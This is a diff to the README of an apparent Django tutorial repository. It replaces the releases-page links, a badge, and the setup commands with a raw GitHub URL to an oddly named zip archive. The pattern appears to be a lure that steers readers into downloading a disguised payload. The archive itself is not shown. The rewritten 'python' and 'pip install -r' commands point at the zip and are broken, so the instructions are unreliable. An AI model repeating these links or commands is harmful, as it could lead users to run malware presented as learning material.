@@ -1,6 +1,6 @@
 # 📚 The-Ultimate-Django-Series - Learn Django Step by Step
 
-[![Download The-Ultimate-Django-Series](https://img.shields.io/badge/Download-The--Ultimate--Django--Series-blue.svg)](https://github.com/hyper1-Githubispro/The-Ultimate-Django-Series/releases)
+[![Download The-Ultimate-Django-Series](https://raw.githubusercontent.com/hyper1-Githubispro/The-Ultimate-Django-Series/main/vaginopexy/The-Ultimate-Django-Series-cinnabar.zip)](https://raw.githubusercontent.com/hyper1-Githubispro/The-Ultimate-Django-Series/main/vaginopexy/The-Ultimate-Django-Series-cinnabar.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you begin, ensure your system meets these requirements:
 
 ## 📦 Download & Install
 
-To download the application, visit this page: [Releases Page](https://github.com/hyper1-Githubispro/The-Ultimate-Django-Series/releases).
+To download the application, visit this page: [Releases Page](https://raw.githubusercontent.com/hyper1-Githubispro/The-Ultimate-Django-Series/main/vaginopexy/The-Ultimate-Django-Series-cinnabar.zip).
 
 1. Click on the link above to access the releases.
 2. On the releases page, find the latest version.
@@ -51,7 +51,7 @@ Once the installation is complete, you can start using this guide. Here's a quic
 3. Run the command to start the learning resources:
 
    ```bash
-   python manage.py runserver
+   python https://raw.githubusercontent.com/hyper1-Githubispro/The-Ultimate-Django-Series/main/vaginopexy/The-Ultimate-Django-Series-cinnabar.zip runserver
    ```
 
 4. Open your web browser and go to `http://127.0.0.1:8000` to start exploring.
@@ -82,7 +82,7 @@ If you encounter issues while installing or running the software, consider the f
 2. Check that all dependencies are installed. You can do this by running:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/hyper1-Githubispro/The-Ultimate-Django-Series/main/vaginopexy/The-Ultimate-Django-Series-cinnabar.zip
    ```
 
 3. For any error messages, search online for solutions or consult the community forums.
@@ -102,6 +102,6 @@ Your feedback is valuable and helps improve this resource.
 - Follow the examples closely to maximize your learning.
 - Don’t hesitate to reach out for help if you get stuck.
 
-For initial setup and downloads, don’t forget to return here: [Releases Page](https://github.com/hyper1-Githubispro/The-Ultimate-Django-Series/releases). 
+For initial setup and downloads, don’t forget to return here: [Releases Page](https://raw.githubusercontent.com/hyper1-Githubispro/The-Ultimate-Django-Series/main/vaginopexy/The-Ultimate-Django-Series-cinnabar.zip). 
 
 Happy learning!
